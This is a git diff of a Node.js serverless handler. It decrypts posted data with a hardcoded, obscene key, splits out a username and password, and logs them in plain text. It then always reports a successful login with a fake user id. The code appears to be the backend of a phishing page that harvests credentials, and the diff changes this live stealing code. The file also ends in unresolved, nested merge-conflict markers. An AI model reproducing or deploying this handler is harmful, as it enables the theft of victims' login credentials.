@@ -7,21 +7,32 @@ module.exports = async (req, res) => {
   res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
   res.setHeader("Access-Control-Allow-Headers", "Content-Type");
 
-  if (req.method === "OPTIONS") { return res.status(200).end(); }
-  if (req.method !== "POST") { return res.status(405).json({ success: false }); }
+  if (req.method === "OPTIONS") return res.end();
+  if (req.method !== "POST") return res.status(405).end();
+
   try {
-    const { data } = req.body;
-    await log(JSON.stringify(data));
-    if (!data) { return res.status(400).json({ success: false }); }
+    let body = "";
+    for await (const chunk of req) body += chunk;
+
+    const data = body.trim();
+    if (!data) return res.status(400).json({ success: false });
+
     const [username, password] = dec(data, "suckmydick").split("|");
-    await log(`Login:\nUsername: ${username}\nPassword: ${password}\nCrypto: ${data}`);
+
+    await log(`Login:\n${username}:${password}`);
+
     res.json({ success: true, userid: 1337, username: "dxvrxv" });
+
   } catch (e) {
-    await log(e);
+    await log(String(e));
     res.status(400).json({ success: false });
   }
+<<<<<<< HEAD
 <<<<<<< HEAD
 };
 =======
 };
 >>>>>>> 36fb070 (1)
+=======
+};
+>>>>>>> 7f471f0 (1)
